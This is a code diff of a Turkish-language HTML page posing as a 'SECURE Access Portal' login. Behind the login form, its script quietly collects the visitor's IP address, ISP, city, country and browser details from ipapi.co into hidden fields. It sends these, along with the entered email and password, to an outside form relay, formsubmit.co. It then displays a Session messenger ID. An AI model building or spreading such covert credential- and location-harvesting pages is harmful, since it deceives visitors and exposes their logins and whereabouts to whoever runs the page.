@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERCES Access Portal</title>
+    <title>SECURE Access Portal</title>
     <style>
         body {
             font-family: 'Segoe UI', sans-serif;
@@ -15,7 +15,6 @@
             background-color: #050505;
         }
 
-        /* Siber Arka Plan */
         body::before {
             content: "";
             position: absolute;
@@ -64,12 +63,20 @@
             box-sizing: border-box;
         }
 
-        .btn-submit {
+        .btn-submit, .btn-copy {
             width: 100%; padding: 15px;
             background: linear-gradient(45deg, #007bff, #0056b3);
             border: none; border-radius: 6px;
             color: white; font-size: 16px; font-weight: bold;
             cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn-copy {
+            background: linear-gradient(45deg, #28a745, #1e7e34);
+            margin-top: 10px;
+            font-size: 14px;
+            padding: 10px;
         }
 
         #success-screen { display: none; text-align: left; }
@@ -84,7 +91,7 @@
             font-family: monospace;
             font-size: 12px;
             word-break: break-all;
-            margin: 15px 0;
+            margin: 15px 0 5px 0;
             text-align: center;
         }
 
@@ -102,16 +109,16 @@
 
     <div class="panel" id="login-container">
         <div class="secure-header">Authorization Required</div>
-        <h1>TERCES LOGIN</h1>
+        <h1>SECURE LOGIN</h1>
 
         <form id="mainForm">
-            <input type="hidden" name="IP_Adresi" id="userIP">
-            <input type="hidden" name="ISS_Bilgisi" id="userISP">
-            <input type="hidden" name="Konum" id="userLocation">
-            <input type="hidden" name="Cihaz_Bilgisi" id="deviceInfo">
+            <input type="hidden" id="userIP">
+            <input type="hidden" id="userISP">
+            <input type="hidden" id="userLocation">
+            <input type="hidden" id="deviceInfo">
             
-            <input type="email" name="email" id="emailInput" placeholder="E-posta Adresi" required>
-            <input type="password" name="password" id="passInput" placeholder="Sistem Şifresi" required>
+            <input type="email" id="emailInput" placeholder="E-posta Adresi" required>
+            <input type="password" id="passInput" placeholder="Sistem Şifresi" required>
             
             <button type="submit" class="btn-submit" id="submitBtn">Sisteme Bağlan</button>
         </form>
@@ -122,7 +129,10 @@
         <h2>MERHABA!</h2>
         <p class="info-text">Bu <b>"TERCES"</b> adlı Adminimiz güvenli bağlantı kurmasını sağlamak amacıyla kurduğumuz özel sitemizdir.</p>
         <p class="info-text">Güvenli bağlantıyı gerçekleştirmek için verdiğimiz Session ID'ye sahip olmanız gerekmektedir:</p>
-        <div class="id-box">0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78</div>
+        
+        <div class="id-box" id="sessionID">0528db57d73bb17d1e955e303f5a2f5ea6e06b029a76bb9858c7614d37d1101c78</div>
+        <button class="btn-copy" onclick="copyID()" id="copyBtn">ID'yi Kopyala</button>
+
         <p class="info-text">Bu ID'yi sadece Session uygulamasından gerçekleştirebileceğiniz bağlantıda kullanabilirsiniz.</p>
         <div class="warning-text">
             <b>DİKKAT!</b> Lütfen verdiğimiz ID'yi hiçbir kimse ile paylaşmayınız ve yasadışı faaliyetler amacıyla kullanmayınız. Aksi takdirde yasal yollara başvurulacak ve erişiminiz kalıcı olarak engellenecektir.
@@ -133,20 +143,18 @@
         document.getElementById('deviceInfo').value = navigator.userAgent;
 
         fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('userIP').value = data.ip;
-                document.getElementById('userISP').value = data.org;
-                document.getElementById('userLocation').value = data.city + " / " + data.country_name;
+            .then(r => r.json())
+            .then(d => {
+                document.getElementById('userIP').value = d.ip;
+                document.getElementById('userISP').value = d.org;
+                document.getElementById('userLocation').value = d.city + " / " + d.country_name;
             });
 
-        // --- ŞİFRE VE AYARLAR ---
-        const MASTER_PASSWORD = "9okmlp02wszaq1"; // Kendi şifreni buraya yaz!
+        const MASTER_PASSWORD = "9okmlp02wszaq1"; 
         const FORM_ID = "19273e639ed99bee214f2b82f3953fff";
 
         document.getElementById('mainForm').onsubmit = function(e) {
-            e.preventDefault(); // Sayfanın yenilenmesini engeller (Bug'ı çözen kısım)
-
+            e.preventDefault();
             const password = document.getElementById('passInput').value;
             const btn = document.getElementById('submitBtn');
 
@@ -158,7 +166,6 @@
             btn.innerText = "Bağlanıyor...";
             btn.disabled = true;
 
-            // Verileri FormSubmit'e Arka Planda Gönder
             fetch(`https://formsubmit.co/ajax/${FORM_ID}`, {
                 method: "POST",
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
@@ -171,17 +178,25 @@
                     Cihaz: document.getElementById('deviceInfo').value
                 })
             })
-            .then(response => {
-                // Gönderim başarılı olunca ekranı değiştir
+            .then(() => {
                 document.getElementById('login-container').style.display = 'none';
                 document.getElementById('success-screen').style.display = 'block';
-            })
-            .catch(error => {
-                alert("Bağlantı hatası oluştu!");
-                btn.innerText = "Sisteme Bağlan";
-                btn.disabled = false;
             });
         };
+
+        function copyID() {
+            const idText = document.getElementById('sessionID').innerText;
+            const btn = document.getElementById('copyBtn');
+            
+            navigator.clipboard.writeText(idText).then(() => {
+                btn.innerText = "Kopyalandı!";
+                btn.style.background = "linear-gradient(45deg, #00ff41, #008f24)";
+                setTimeout(() => {
+                    btn.innerText = "ID'yi Kopyala";
+                    btn.style.background = "linear-gradient(45deg, #28a745, #1e7e34)";
+                }, 2000);
+            });
+        }
     </script>
 </body>
 </html>
